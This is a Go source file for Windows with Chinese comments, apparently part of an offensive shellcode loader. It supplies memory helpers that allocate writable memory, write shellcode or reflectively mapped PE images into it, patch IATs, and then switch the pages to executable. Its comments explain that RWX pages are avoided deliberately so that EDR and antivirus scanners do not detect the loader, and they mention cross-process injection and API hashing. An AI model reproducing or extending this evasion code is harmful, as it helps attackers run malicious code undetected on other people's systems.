//go:build windows

package main

import (
	"fmt"
	"unsafe"
)

// ─── 内存保护统一入口：RW → 写 → RX ──────────────────────────────────────────
//
// 背景：扫描型 EDR/AV 把 "私有无映像内存同时可写可执行(PAGE_EXECUTE_READWRITE)
// + 写入后立刻执行" 当作最高优先级特征（也是很多 AV 的行为规则）。因此本包
// **绝不请求 RWX(0x40)**：所有自己申请 / 自己改保护的内存统一走
//
//	allocRW(size)          → PAGE_READWRITE(0x04) 申请（不可执行）
//	（写入 shellcode / 映射 PE / 应用重定位 / 填充 IAT …都在这阶段完成）
//	protectRX(addr, size)  → PAGE_EXECUTE_READ(0x20) 之后才允许执行
//	protectRW(addr, size)  → 需要再次改写内容时先改回 RW，改完再 protectRX
//
// 需要"改几个字节再还原"的场景直接用 withWritable()，它负责 RW→fn→还原原保护。
//
// 唯一不能拆两步的是系统 API 自身要求"申请时一次传入保护值"的场合，本包的做法是
// 申请时只给 RW / RX 这类单一权限（例如跨进程注入用 VirtualAllocEx(RW) +
// WriteProcessMemory + VirtualProtectEx(RX)），因此不存在 RWX 请求。

// 页保护常量（等价于 windows.PAGE_*，用数值以免与 x/sys 常量混淆）。
const (
	pgReadWrite   = 0x04 // PAGE_READWRITE
	pgExecuteRead = 0x20 // PAGE_EXECUTE_READ
	pgRWX         = 0x40 // PAGE_EXECUTE_READWRITE：仅用于识别/拒绝，绝不作为请求值
	pgExecMask    = 0xF0 // 0x10/0x20/0x40/0x80：四种"可执行"保护位
)

// memCommitReserve = MEM_COMMIT | MEM_RESERVE。
const memCommitReserve = 0x1000 | 0x2000

// sanitizeProt 保证传给 VirtualProtect 的保护值永不含可写+可执行组合：
// 旧保护只要带执行位就统一收敛为 PAGE_EXECUTE_READ(0x20)（RWX 0x40 与
// EXECUTE_WRITECOPY 0x80 都不会被还原回去）；非执行保护原样返回。
func sanitizeProt(prot uint32) uint32 {
	if prot&pgExecMask != 0 {
		return pgExecuteRead
	}
	return prot
}

// setProtect 修改 [addr, addr+size) 的页保护，返回修改前的保护值。
// 统一走 kernel32!VirtualProtect（resolveAPI/apihash 风格，与包内其它调用一致），
// 并在入口硬性拒绝任何 RWX 请求，保证本包永远不会把页改成可写可执行。
func setProtect(addr, size uintptr, prot uint32) (uint32, error) {
	if addr == 0 || size == 0 {
		return 0, fmt.Errorf("setProtect: invalid range addr=0x%x size=0x%x", addr, size)
	}
	if prot&pgRWX != 0 {
		return 0, fmt.Errorf("refuse PAGE_EXECUTE_READWRITE(0x40): addr=0x%x size=0x%x", addr, size)
	}
	var old uint32
	ok, _, callErr := resolveAPI("kernel32.dll", "VirtualProtect").
		Call(addr, size, uintptr(prot), uintptr(unsafe.Pointer(&old)))
	if ok == 0 {
		return old, fmt.Errorf("VirtualProtect(0x%x, 0x%x, 0x%x) failed: %v", addr, size, prot, callErr)
	}
	return old, nil
}

// allocRW 申请一块可读写（**非可执行**）内存，返回基址与整页对齐后的区域大小。
// 这是本包统一的内存申请入口：写入、重定位、IAT 填充都在 RW 阶段完成，
// 写完后必须调用 protectRX 才能执行。
func allocRW(size uintptr) (uintptr, uintptr, error) {
	if size == 0 {
		return 0, 0, fmt.Errorf("allocRW: zero size")
	}
	base, _, callErr := resolveAPI("kernel32.dll", "VirtualAlloc").
		Call(0, size, memCommitReserve, pgReadWrite)
	if base == 0 {
		return 0, 0, fmt.Errorf("VirtualAlloc(PAGE_READWRITE, 0x%x) failed: %v", size, callErr)
	}
	return base, (size + 0xFFF) &^ 0xFFF, nil
}

// protectRX 把 [addr, addr+size) 从 RW 改为 RX（可执行不可写）。
func protectRX(addr, size uintptr) error {
	_, err := setProtect(addr, size, pgExecuteRead)
	return err
}

// protectRW 反向：执行前需要改写代码/数据时先调它（可写不可执行）。
func protectRW(addr, size uintptr) error {
	_, err := setProtect(addr, size, pgReadWrite)
	return err
}

// protectRWGet 同 protectRW，但额外返回改前的保护值，便于之后按需还原。
func protectRWGet(addr, size uintptr) (uint32, error) {
	return setProtect(addr, size, pgReadWrite)
}

// restoreProtect 还原页保护（经 sanitizeProt 过滤，绝不还原成 RWX）。
// old 为 0（取不到原保护）时退化为 RX，保证代码可继续执行。
func restoreProtect(addr, size uintptr, old uint32) error {
	if old == 0 {
		return protectRX(addr, size)
	}
	_, err := setProtect(addr, size, sanitizeProt(old))
	return err
}

// withWritable 临时把 [addr, addr+size) 改成 RW，执行 fn，随后还原原保护。
// 用于"区域已经 RX / 只读，但还需要再改几个字节"的场景（如反射映射完成后补 IAT），
// 避免为了可写而把整块内存长期留成 RWX。
func withWritable(addr, size uintptr, fn func()) error {
	old, err := protectRWGet(addr, size)
	if err != nil {
		return err
	}
	fn()
	return restoreProtect(addr, size, old)
}
